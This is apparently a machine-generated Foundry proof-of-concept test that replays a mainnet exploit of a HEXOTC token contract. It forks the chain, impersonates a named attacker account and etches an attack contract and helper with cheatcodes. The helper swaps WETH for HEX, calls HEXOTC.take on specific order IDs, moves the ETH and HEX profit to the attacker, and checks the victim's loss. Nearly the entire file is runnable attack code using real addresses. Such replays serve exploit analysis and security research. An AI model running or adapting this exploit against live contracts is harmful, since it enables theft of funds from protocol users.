
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 23260640;
    uint256 constant TX_TIMESTAMP = 1756637435;
    uint256 constant TX_BLOCK_NUMBER = 23260641;
    uint256 constant TX_VALUE = 37000000000000000;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _installRuntime();
        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _snapEcon();
        _logBalances("Before exploit");
        attack.executeSetup{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        _hydrateAttackHelper();
    }

    function _hydrateAttackHelper() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_helper,
                bytes32(uint256(0)),
                bytes32(uint256(247474035133704053465765255309405900025495481145))
            );
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 122278953515569393);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.HEX, "HEX", 44561624407);
        economicOracles.push(
            EconomicOracle(
                Addresses.A_9E0905_8BE6, Addresses.HEX, "HEX", "victim_loss", false, 9236561624407, false
            )
        );
    }
}

contract OurAttack {




    AttackerHelper public helper;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {
        helper = AttackerHelper(payable(Addresses.attack_helper));
    }

    function executeSetup() external payable {
        if (address(helper) == address(0)) _ctorBootstrap();
        _setup();
    }

    function _setup() public {
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper();
        AttackerHelper(payable(Addresses.attack_helper)).helperCb{value: 37000000000000000}();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

contract AttackerHelper {
    receive() external payable {}

    function take() external payable {
        _helperCb();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0xfa461e33) {
            _callback();
            return;
        }
        _entryCb();
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function callback() external payable {
        _callback();
        return;
    }

    function _entryCb() internal {}

    function replayProfit() external {
        try this.__settle0_8() {} catch {}
    }

    function __settle0_8() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(0, 8)) return;
        if (Harness.safeBalance(Addresses.HEX, Addresses.attacker_eoa) >= 44561624407) {
            _markSettle(0, 8);
            return;
        }
        _markSettle(0, 8);
        uint256 settleAmount = 44561624407;
        uint256 settleAmountAvailable = IERC20Like(Addresses.HEX).balanceOf(address(this));
        if (settleAmount > settleAmountAvailable) settleAmount = settleAmountAvailable;
        IERC20Like(Addresses.HEX).transfer(Addresses.attacker_eoa, settleAmount);
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _helperCb() internal {
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 37000000000000000) depositAmount = 37000000000000000;
            if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        }
        IContract_9E0905_8BE6(Addresses.A_9E0905_8BE6)
            .swap(
                Addresses.attack_helper,
                false,
                int256(37000000000000000),
                uint160(uint160(0x00fffd8963efd1fc6a506488495d951d5263988d25)),
                hex""
            );
        IERC20Like(Addresses.HEX).approve(Addresses.HEXOTC, type(uint256).max);
        IHEXOTC(Addresses.HEXOTC)
            .take(bytes32(hex"0000000000000000000000000000000000000000000000000000000000000043"));
        IHEXOTC(Addresses.HEXOTC)
            .take(bytes32(hex"000000000000000000000000000000000000000000000000000000000000002b"));
        IERC20Like(Addresses.WETH).balanceOf(Addresses.attack_helper);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 159420000000000000) nativeTransferAmount = 159420000000000000;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        uint256 hexBalanceOfAttackHelper = IERC20Like(Addresses.HEX).balanceOf(Addresses.attack_helper);
        IERC20Like(Addresses.HEX).transfer(Addresses.attacker_eoa, hexBalanceOfAttackHelper);
    }

    function _callback() internal {
        _markCallback(1);
        uint256 transferLiveAmount = 37000000000000000;
        IERC20Like(Addresses.WETH).transfer(Addresses.A_9E0905_8BE6, transferLiveAmount);
    }

    function _attack() internal {
        _markCallback(2);
    }

    function _helper() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x07185a9E74F8DcEb7d6487400E4009Ff76d1Af46;
    address internal constant HEXOTC = 0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1;
    address internal constant HEX = 0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39;
    address internal constant attack_contract = 0x6728F1e6764081F7161e82e087581aEfa21723fc;
    address internal constant A_68CBC1_FFDA = 0x68CBc12a70A14f055110dDBEc73A7F0F5551ffDA;
    address internal constant attack_helper = 0x6E0113C4F1De65B98381BAA6443b20834B70D4C5;
    address internal constant A_9E0905_8BE6 = 0x9e0905249CeEFfFB9605E034b534544684A58BE6;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_FEDC84_5E5C = 0xFeDc84d0cd5FE6dB2B2f8aC31c7e31e49B665e5c;
}

interface IContract_9E0905_8BE6 {
    function swap(address, bool, int256, uint160, bytes calldata) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IHEXOTC {
    function take(bytes32) external;
}

interface IWETH {
    function deposit() external payable;
}

interface Iattack_helper {
    function take() external payable;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
